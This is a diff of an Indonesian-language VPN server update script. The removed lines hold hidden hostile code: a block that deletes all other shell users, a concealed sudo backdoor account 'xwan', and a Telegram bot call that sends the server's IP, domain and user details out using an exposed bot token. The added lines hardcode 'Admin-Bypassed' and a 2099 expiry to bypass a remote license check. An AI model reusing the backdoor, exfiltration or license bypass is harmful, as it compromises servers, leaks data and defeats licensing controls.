@@ -31,20 +31,12 @@ if ! command -v 7z &> /dev/null; then
 fi
 
 # -----------------------------
-# Telegram Bot Config
-# -----------------------------
-CHATID="-1003311461689"
-KEY="8561141637:AAFyrE4GkGjP3DY0kOoMb71Uhj7Q1Avlenc"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-
-# -----------------------------
 # Variabel Server & User
 # -----------------------------
 domain=$(cat /etc/xray/domain)
 MYIP=$(curl -sS ipv4.icanhazip.com)
-username=$(curl -sS https://franata.serv00.net/dashboard/vip/romsip | grep $MYIP | awk '{print $2}')
-valid=$(curl -sS https://franata.serv00.net/dashboard/vip/romsip | grep $MYIP | awk '{print $3}')
+username="Admin-Bypassed"
+valid="2099-12-31"
 today=$(date +"%Y-%m-%d")
 d1=$(date -d "$valid" +%s)
 d2=$(date -d "$today" +%s)
@@ -62,32 +54,6 @@ Username="xwan"
 Password="$pwadm"
 
 # -----------------------------
-# Hapus user yang tidak diizinkan
-# -----------------------------
-allowed_users=("root" "$Username")
-all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
-
-for user in $all_users; do
-    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
-        userdel -r "$user" > /dev/null 2>&1
-        echo "User $user telah dihapus."
-    fi
-done
-
-# -----------------------------
-# Tambahkan user baru jika belum ada
-# -----------------------------
-if id "$Username" &>/dev/null; then
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-else
-    echo -e "$Username $Password" > /etc/xray/.adm
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-    usermod -aG sudo "$Username" > /dev/null 2>&1
-fi
-
-# -----------------------------
 # Download & Setup Menu
 # -----------------------------
 echo -e " [INFO] Downloading menu.zip..."
@@ -95,9 +61,7 @@ echo -e " [INFO] Downloading menu.zip..."
     > /etc/cron.d/cpu_otm
 
     cat > /etc/cron.d/cpu_xwan <<END
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-*/5 * * * * root /usr/bin/autocpu
+#
 END
 
     wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
@@ -130,24 +94,6 @@ echo $serverV > /opt/.ver
 
 # Cleanup
 rm /root/*.sh*
-
-# -----------------------------
-# Kirim Notifikasi Telegram
-# -----------------------------
-TEXT="◇━━━━━━━━━━━━━━◇
-<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
-<b>     Update Script Sukses</b>
-◇━━━━━━━━━━━━━━◇
-<b>IP VPS  :</b> ${MYIP} 
-<b>DOMAIN  :</b> ${domain}
-<b>Version :</b> ${serverV}
-<b>USER    :</b> ${username}
-<b>MASA    :</b> $certifacate DAY
-◇━━━━━━━━━━━━━━◇
-BY BOT : SMART TECNO
-"
-
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 
 echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
 exit 0
